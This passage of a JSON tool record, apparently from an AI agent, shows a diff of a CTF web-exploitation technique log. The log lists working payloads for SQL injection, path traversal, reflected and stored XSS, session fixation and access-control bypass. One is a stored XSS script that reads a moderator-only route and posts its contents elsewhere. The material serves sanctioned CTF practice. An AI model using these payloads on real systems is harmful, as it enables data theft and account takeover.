er**: HTML `<p>`/pill text, JSON `support_note` | `note` | `evidence`. Rule: regex","-  `proof_[0-9a-f]{32}` over every body (decode JSON / base64 / zip first) -- don't key on field names.","+## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)","+- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question","+  `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.","+- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on","+  every target (home, robots, /api/clues, /openapi.json), then run the concept probes the recon hints first, the rest","+  after. Earlier solvers' `answer()` ONLY -- day-21 solvers' `fallback()`s import each other (infinite recursion =","+  timeout). Running every probe at once x3 targets slowed each 2-5x: stage them.","+- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action`; secondary","+  `callback` | `internal` | `status` | `staff-<hex8>`. Rule: pick routes by clue KEY role (`feature_route`,","+  `secondary_route`, `*_data_route`, `*_template`), never by the word in the value (D06 TT broke on `/internal-`).","+- **Resource noun on boards** (D07): `/api/messages` + `/messages/{id}` | `/api/postcards` + `/postcards/{id}`.","+  Rule: take the submit route and the `/<noun>/{id}` view from `/openapi.json` `paths` / the submit response's","+  `url`, else the home page (it lists every entry with its receipt).","+- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file","+  `environment-copy-<hex>.json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2","+  same-origin crawl from robots/sitemap/comments, regex `proof_` in bodies and zip members.","+- **IDOR (D02)**: foreign ids in `/api/history`; API template from the page's `fetch()`. Rule: request foreign ids.","+- **SQLi (D03)**: `/lookup?q=` wrapped in `('%..%')`. Rule: tautologies covering `'` `')` `'))` `\"` + `--`/`#`.","+- **LFI (D04)**: `reader.php?doc=<page>`, prompt-named `/run/huntress/objective.txt`. Rule: every param with `.`/`/`","+  in its value x `../`*10+path, absolute, `....//`, `..%2f`, `php://filter`, `<orig dir>/`+`../`*10.","+- **Access control (D05)**: GET (then POST) every `/...` value in the clue JSON.","+- **Proof carrier**: HTML text, JSON `support_note` | `note` | `evidence`, a receipt shown on a board page. Rule:","+  regex `proof_[0-9a-f]{32}` over every body -- don't key on field names."," "," ## Recognition cues -> first move","-- `targets[]` in the contract -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without","-  `--max-time`; Cloudflare 403'd urllib's default UA on D03), then `/robots.txt`, `/sitemap.xml`, `/api/clues`.","-- `Disallow:` path / \"deployment note\" comment -> fetch it, then every link on the index it returns (D01).","-- \"Signed in as X\" + `/<things>/<id>` links + `fetch('/api/...')` -> IDOR: foreign ids from feeds (D02).","-- A search form, \"the database\", \"one pointed question\" -> SQLi tautology with paren closing (D03).","-- `?doc=` / `?page=` / `?file=` with a filename value + \"directory/boundary/mounted at /path\" -> traversal (D04).","-- \"staff-only\", \"sign but no lock\", \"bouncer\", `current_role` -> unprotected route from the app's own clues (D05).","-- JSON body with `effect` + `evidence` -> the exploit landed; `evidence` is the answer.","-- Static evidence (HAR, pcap, logs, web shells, JWTs) has NOT appeared yet; the cues for it are in the coverage atlas.","+- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;","+  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.","+- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login, browser).","+- `Disallow:` / \"crawler policy\" comment -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR.","+- Search form / \"database\" -> D03 tautology. `?doc=` + \"stay inside / mounted at /path\" -> D04 traversal.","+- \"staff-only door, just a sign\", `feature_route` -> D05 GET it.","+- \"repeats everything you tell it\", \"talks back\", `callback_nonce` -> D06: reflect `<script>fetch('<cb>?nonce=N')","+  </script>` via `?q=` on the feature route, then GET the callback yourself with browser headers.","+- \"guestbook\", \"reviewer stops by\", \"good things come to those who wait\", `moderator_data_route` -> D07: store a","+  script that fetches the data route and POSTs it to the receipt route; poll the entry page.","+- \"plant your session\", \"welcome mat\", \"somebody else's credentials\", `session_hint` -> D08 session fixation.","+- JSON with `effect` + `evidence` = landed; `evidence` is the answer."," "," ## Day by day","-- **D01 Back Up a Minute (cal. day 19)** -- robots.txt `Disallow: /snapshots-<hex>/` -> directory index ->","-  `environment-copy-<hex>.json.bak` -> `support_note: proof_...`. Lost time to `preparing` with no URL yet","-  (re-poll `hctf status` until `targets[]` appears) and to `--from-solver` refusing a target-only mode (submitted the","-  value directly).","-- **D02 Permission to Slip (cal. 19)** -- IDOR: `/api/history` leaked a foreign case id; `GET /api/briefs/<id>` (template","-  from the brief page's `fetch`) returned the note with the proof. Target left `preparing` after ~2 min.","-- **D03 Query Me This (cal. 19)** -- SQLi: `GET /lookup?q=zz') OR 1=1 --` showed the hidden `restricted` row","-  \"Private escalation\" with the proof. `' OR '1'='1`, `%' OR 1=1 --` and UNION all returned \"Nothing matched\"","-  (input wrapped in parentheses). Mastery set 2 was the D01 backup target.","-- **D04 Stay in Your Directory (cal. day 20)** -- \"The viewer should stay inside its pages directory ... proof mounted","-  at /run/huntress/objective.txt\". Home linked `reader.php?doc=<page>`; `GET","-  /reader.php?doc=../../../../../../run/huntress/objective.txt` (>= 6 levels; 10 is safe) printed the proof after the","-  \"Document viewer\" pill. The absolute path and `....//` did NOT work. Single CORRECT in 51 s; TT by solver in 8.9 s.","-  **Mastery had trouble**: Target 2 (LFI) was solved, but the solver missed Target 1, a D01 backup site (Node.js","-  \"Green Light\" status page, comment \"review crawler policy\", robots `Disallow: /deploy-444d0/`). Its `exposed()`","-  fetched the Disallow path's index but never followed that index's `site-config-<hex>.json.bak` link. A live worker","-  read it by hand (~6 min after start, ~5 of them in `preparing`). Fix: depth-2 crawl + all-concepts dispatch.","-- **D05 Administratively Speaking (cal. 20)** -- \"a staff-only door with no lock on it -- just a sign\". `/api/clues`","-  -> `{\"framework\":\"Django\",\"feature_route\":\"/dispatch-fa3df6\",\"current_role\":\"analyst\"}`; a plain GET (POST gave","-  the same) of the feature route -> `{\"ok\":true,\"effect\":\"framework_authorization_bypassed\",\"evidence\":\"proof_...\"}`.","-  No header, cookie or role change needed; `/admin/` and `<route>/admin` returned `not_found`. Single CORRECT in","-  47 s; TT 15.4 s; Mastery 340 s (321 s preparing), with the other target solved by the fallback chain that imports","-  the earlier days' solvers.","+- **D01-D05 (cal. 19-20)**, compressed: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery D04 missed","+  it: crawl only one level deep). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1","+  --` (plain `' OR '1'='1` failed: paren-wrapped). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt` (absolute","+  and `....//` failed); single 51 s. D05 `/api/clues` -> GET `/dispatch-<hex6>` -> `effect:","+  framework_authorization_bypassed`; single 47 s, Mastery 340 s (321 s preparing).","+- **D06 Reflect Upon This (cal. 21)** -- reflected XSS with a server-judged \"isolated callback\". Clues:","+  `feature_route` (`/execute-<hex6>` | `/process-<hex6>`, reflects `?q=` raw into `<div id=\"preview\">`),","+  `secondary_route` (`/callback-<hex6>` | `/internal-<hex6>`), `callback_nonce` (12 hex). A bare GET of the callback","+  -> `{\"error\":\"browser_callback_required\"}`. Worked: GET `<feature>?q=<script>fetch('<cb>?nonce=N')</script>`","+  (confirms reflection), then GET `<cb>?nonce=N` with `Sec-Fetch-Site: same-origin`, `Sec-Fetch-Mode: cors`,","+  `Sec-Fetch-Dest: empty`, `Referer: <the reflected URL>`, `Origin: <base>`, `X-Callback-Nonce: N` -> `effect:","+  isolated_browser_callback`. No real browser needed. Single CORRECT 83 s. **TT had trouble**: solver chose the","+  callback by the word `callback` in the route value; TT's was `/internal-<hex6>` (2 generalize workers) -> pick by","+  key `secondary_route`.","+- **D07 Stored for Later (cal. 21)** -- stored XSS executed by a real moderator bot. Clues: `moderator_data_route`","+  (`/staff-<hex8>`, 401/403 for us) + `receipt_route_template` (`/api/<noun>/{id}/receipt-<hex6>`). Worked: POST JSON","+  `{\"message\":\"<script>(async()=>{t=await(await fetch(DATA,{credentials:'include'})).text();await fetch(RCPT(id),","+  {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({evidence:t})})})()</script>\",","+  \"name\":\"guest\"}` to `/api/messages` -> `{id,url}`; the entry id is read from `location.pathname` inside the script;","+  poll `/messages/{id}` until the receipt shows the proof. Single CORRECT 78 s. **Mastery had trouble**: Target 2","+  used `/api/postcards` + `/postcards/{id}` and the solver polled `/messages/{id}` (404) -> derive the view from","+  openapi/submit response/home; its receipt also landed AFTER the 12 s poll window (poll longer on untimed runs,","+  re-read the board at the end). A compounding D04 LFI target timed out on solver mutual recursion (fixed:","+  `answer()` only). Mastery submit got HTTP 503 `temporarily_unavailable` although the GM had registered CORRECT;","+  the retry said `already_solved` -> check `hctf status` after a 503 before retrying.","+- **D08 Session Impression (cal. 21)** -- session fixation (\"Laravel\", PHP). Clues: `feature_route: /action-<hex6>`","+  (planting route), `secondary_route: /status-<hex6>` (bare -> 403 `authenticated_login_required`), `session_hint:","+  <12 hex>`. Bare `/action-*` -> 400 `session_id_required`; `?session=`, `?session_id=`, JSON body, `X-Session-Id`,","+  `laravel_session`/`session` cookies all failed; `GET /action-<hex6>?sid=<session_hint>` -> `{\"ok\":true,","+  \"session_established\":true}` + `Set-Cookie: arena_session=<hint>` (the victim then logs in on that id). Then `GET","+  /status-<hex6>` with `Cookie: arena_session=<hint>` -> `effect: fixed_session_privilege_transfer`. Single CORRECT","+  116 s. **Mastery had trouble** (3 targets incl. a D05 target, ~15 min, 3 generalize workers): racing every earlier","+  solver on all targets at once starved the app (5 s -> 13 s); fixed by running today's probe alone when the clues","+  carry a `sess|sid` key and staging the rest by recon hints. An unverified variant (`expected.json` = `{}`) can't go","+  green in solver-test -- that's harness bookkeeping, not a solver bug."," "," ## GM answer conventions learned","-- Answer = the bare token `proof_<32 lowercase hex>` (no flag wrapper; the GM's `flag` field in the CORRECT body is","-  a different value, so never submit it). Normalization `trim`. Ids `proof-1`..`proof-N` in target order.","-- Batch all Mastery proofs in one submit. A partial submit returns `accepted` + `remaining` and is kept.","-- `already_solved` after CORRECT is harmless (parallel workers raced).","+- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.","+  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`.","+- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),","+  `fixed_session_privilege_transfer` (D08). D07 shows the proof in a moderator receipt on the entry page instead.","+- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed."," "," ## Pitfalls that cost time","-- Routing by prompt keywords in Mastery: the earlier-day target is described by TODAY's prompt (D04 missed T1).","-- One-level crawls: a `Disallow` dir is an index page, and the proof is one link deeper (D04 Mastery).","-- Live cases can't be replayed: the target 410s after CORRECT and the stored contract may be the `preparing` body","-  without `targets`. Save the target's responses during the solve; don't hard-code the proof.","-- Waiting on `preparing`: poll status; Mastery takes ~5 min, so start it early and don't treat the wait as a failure.","-- `curl` without `--max-time` is blocked by the unattended-run hook; default urllib UA can draw a Cloudflare 403.","+- Choosing routes by the WORD in a clue value (`callback`, `messages`) -- words are re-dealt; use clue keys / openapi.","+- Routing by prompt keywords in Mastery: earlier-day targets get today's prompt (D04 missed T1).","+- One-level crawls: the D01 proof sits one link below the Disallow index.","+- Solvers importing each other's `fallback()` -> mutual recursion -> timeout. Import `answer()` only.","+- Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes.","+- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.","+- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.","+- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403."]}],"originalFile":"# web — technique log (lane-days D01-D05 released; updated after every day)\n\nHow the lane has looked so far (observations, not guarantees):\n- **Late release, catch-up pace.** No web on calendar days 1-18. Calendar day 19 released lane-days D01-D03 and\n  day 20 released D04-D05 (GM ids `web-exploitation-day-NN-<slug>`, folder `challenges/dayNN/web-*` = CALENDAR day).\n  Expect 2-3 new lane-days per calendar day until it catches up. Each lane-day = ONE classic OWASP bug, named by a\n  title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me This\",\n  D04 path traversal/LFI \"Stay in Your Directory\", D05 missing function-level authorization \"Administratively Speaking\".\n- **No artifact: a live target.** `start` returns `result: preparing` (no deadline) until ready, then\n  `targets: [{\"id\": \"Target N\", \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]` (D01-D02 it was only in the\n  status body; since D03 also in contract.json). Reachable DIRECTLY from the host (no `hb exec` needed), behind\n  Cloudflare. After CORRECT the host returns `410 {\"state\":\"completed\"}` on every path; an untimed target stops after\n  30 min idle.\n- **Contract is fixed:** one question per target: `proof-N` \"Recover the proof from Target N.\", artifact `Target N`,\n  `exact_text`, normalization `trim`. The answer is always a token `proof_<32 lowercase hex>` printed by the app.\n- **Mastery = 2 targets**: today's bug + ONE earlier lane-day's bug (D01 backup both times so far: D03 set 2, D04\n  Target 1). The prompt describes only today's bug, so the older target has no text hint. Mastery targets take\n  ~310-320 s to leave `preparing` (singles / Time Trials 4-10 s).\n- **Apps narrate themselves**: robots.txt `Disallow`, HTML comments (`<!-- deployment note: remember to review\n  crawler policy -->`), `/api/clues` JSON (`framework`, `feature_route`, `current_role`), `/api/history`, page JS\n  `fetch('/api/...')`, the prompt naming an absolute path. Read these before guessing any path. \"Framework\" banners\n  (Django, \"tiny native Node.js HTTP server\", `.php` names) are costume; the bug is what the title says.\n\n## Variant axes (what differs between the single, Time Trial and Mastery variants -- parse every value listed)\n- **Target host / count**: random 48-hex subdomain per attempt; 1 target (single, TT), 2 (Mastery). Rule: map\n  question `artifact` \"Target N\" to `targets[].id` (fallback: Nth entry); never reuse a URL across attempts.\n- **Mastery composition / order**: earlier-day target at set 2 (D03) or Target 1 (D04); the prompt is today's only.\n  Rule: run EVERY known concept probe on EVERY target (cheap recon first), never route by prompt keywords alone.\n- **Backup exposure (D01) names**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; index title \"Deployment\n  archive\"; file `environment-copy-<hex>.json.bak` | `site-config-<hex6>.json.bak` (+ `release-notes.txt` decoy);\n  proof under JSON key `support_note`. Rule: robots/sitemap/comment/href paths -> fetch -> follow the links ON that\n  index too (depth 2, same origin) -> regex `proof_` in bodies and zip members.\n- **IDOR (D02)**: object ids from `/api/history` (foreign `case_id`, owner `executive`, `visibility: reference_only`);\n  API template from the page's `fetch()`. Rule: harvest every `id`/`*_id` from JSON feeds, request the foreign ones.\n- **SQLi (D03)**: GET form `/lookup?q=`; WHERE wraps input in `('%..%')` + a visibility AND; errors swallowed.\n  Rule: tautology list covering `'`, `')`, `'))`, `\"`, `#`/`--` endings (`zz') OR 1=1 --` worked).\n- **LFI (D04)**: home links `reader.php?doc=<page>`; target path named in the prompt (`/run/huntress/objective.txt`).\n  Rule: every query param whose value has `.` or `/` x payloads `../`*10+path, absolute, `....//`, `..%2f`,\n  `php://filter/convert.base64-encode/resource=`, and `<orig dir>/` + `../`*10 (TT variant passed with this set).\n- **Access control (D05)**: `/api/clues` -> `feature_route: /dispatch-<hex6>`, `framework` label, `current_role:\n  analyst`; proof in JSON key `evidence` (`{\"ok\":true,\"effect\":\"framework_authorization_bypassed\",...}`). Rule:\n  GET (then POST) every `/...` value in the clue JSON; then role headers/query/cookie as a fallback.\n- **Proof carrier**: HTML `<p>`/pill text, JSON `support_note` | `note` | `evidence`. Rule: regex\n  `proof_[0-9a-f]{32}` over every body (decode JSON / base64 / zip first) -- don't key on field names.\n\n## Recognition cues -> first move\n- `targets[]` in the contract -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without\n  `--max-time`; Cloudflare 403'd urllib's default UA on D03), then `/robots.txt`, `/sitemap.xml`, `/api/clues`.\n- `Disallow:` path / \"deployment note\" comment -> fetch it, then every link on the index it returns (D01).\n- \"Signed in as X\" + `/<things>/<id>` links + `fetch('/api/...')` -> IDOR: foreign ids from feeds (D02).\n- A search form, \"the database\", \"one pointed question\" -> SQLi tautology with paren closing (D03).\n- `?doc=` / `?page=` / `?file=` with a filename value + \"directory/boundary/mounted at /path\" -> traversal (D04).\n- \"staff-only\", \"sign but no lock\", \"bouncer\", `current_role` -> unprotected route from the app's own clues (D05).\n- JSON body with `effect` + `evidence` -> the exploit landed; `evidence` is the answer.\n- Static evidence (HAR, pcap, logs, web shells, JWTs) has NOT appeared yet; the cues for it are in the coverage atlas.\n\n## Day by day\n- **D01 Back Up a Minute (cal. day 19)** -- robots.txt `Disallow: /snapshots-<hex>/` -> directory index ->\n  `environment-copy-<hex>.json.bak` -> `support_note: proof_...`. Lost time to `preparing` with no URL yet\n  (re-poll `hctf status` until `targets[]` appears) and to `--from-solver` refusing a target-only mode (submitted the\n  value directly).\n- **D02 Permission to Slip (cal. 19)** -- IDOR: `/api/history` leaked a foreign case id; `GET /api/briefs/<id>` (template\n  from the brief page's `fetch`) returned the note with the proof. Target left `preparing` after ~2 min.\n- **D03 Query Me This (cal. 19)** -- SQLi: `GET /lookup?q=zz') OR 1=1 --` showed the hidden `restricted` row\n  \"Private escalation\" with the proof. `' OR '1'='1`, `%' OR 1=1 --` and UNION all returned \"Nothing matched\"\n  (input wrapped in parentheses). Mastery set 2 was the D01 backup target.\n- **D04 Stay in Your Directory (cal. day 20)** -- \"The viewer should stay inside its pages directory ... proof mounted\n  at /run/huntress/objective.txt\". Home linked `reader.php?doc=<page>`; `GET\n  /reader.php?doc=../../../../../../run/huntress/objective.txt` (>= 6 levels; 10 is safe) printed the proof after the\n  \"Document viewer\" pill. The absolute path and `....//` did NOT work. Single CORRECT in 51 s; TT by solver in 8.9 s.\n  **Mastery had trouble**: Target 2 (LFI) was solved, but the solver missed Target 1, a D01 backup site (Node.js\n  \"Green Light\" status page, comment \"review crawler policy\", robots `Disallow: /deploy-444d0/`). Its `exposed()`\n  fetched the Disallow path's index but never followed that index's `site-config-<hex>.json.bak` link. A live worker\n  read it by hand (~6 min after start, ~5 of them in `preparing`). Fix: depth-2 crawl + all-concepts dispatch.\n- **D05 Administratively Speaking (cal. 20)** -- \"a staff-only door with no lock on it -- just a sign\". `/api/clues`\n  -> `{\"framework\":\"Django\",\"feature_route\":\"/dispatch-fa3df6\",\"current_role\":\"analyst\"}`; a plain GET (POST gave\n  the same) of the feature route -> `{\"ok\":true,\"effect\":\"framework_authorization_bypassed\",\"evidence\":\"proof_...\"}`.\n  No header, cookie or role change needed; `/admin/` and `<route>/admin` returned `not_found`. Single CORRECT in\n  47 s; TT 15.4 s; Mastery 340 s (321 s preparing), with the other target solved by the fallback chain that imports\n  the earlier days' solvers.\n\n## GM answer conventions learned\n- Answer = the bare token `proof_<32 lowercase hex>` (no flag wrapper; the GM's `flag` field in the CORRECT body is\n  a different value, so never submit it). Normalization `trim`. Ids `proof-1`..`proof-N` in target order.\n- Batch all Mastery proofs in one submit. A partial submit returns `accepted` + `remaining` and is kept.\n- `already_solved` after CORRECT is harmless (parallel workers raced).\n\n## Pitfalls that cost time\n- Routing by prompt keywords in Mastery: the earlier-day target is described by TODAY's prompt (D04 missed T1).\n- One-level crawls: a `Disallow` dir is an index page, and the proof is one link deeper (D04 Mastery).\n- Live cases can't be replayed: the target 410s after CORRECT and the stored contract may be the `preparing` body\n  without `targets`. Save the target's responses during the solve; don't hard-code the proof.\n- Waiting on `preparing`: poll status; Mastery takes ~5 min, so start it early and don't treat the wait as a failure.\n- `curl` without `--max-time` is blocked by the unattended-run hook; default urllib UA can draw a Cloudflare 403.\n","userModified":false},"tool_result_meta":[{"id":"toolu_01CoFR4aYSck66P7AH2ituQa","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
